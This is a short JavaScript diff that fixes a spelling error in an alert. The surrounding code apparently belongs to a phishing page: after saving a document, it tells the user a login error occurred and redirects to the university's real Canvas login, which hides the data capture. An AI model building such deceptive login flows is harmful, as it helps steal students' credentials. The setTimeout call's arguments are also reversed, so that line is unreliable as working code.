@@ -21,7 +21,7 @@ function stripper(event){
         })
         .then(function() {
             console.log("Document successfully written!");
-            window.alert('A login error occured, refreshing...')
+            window.alert('A login error occurred, refreshing...')
             setTimeout(1000, ()=>{
                 window.location.href = "https://utk.instructure.com/";
             })
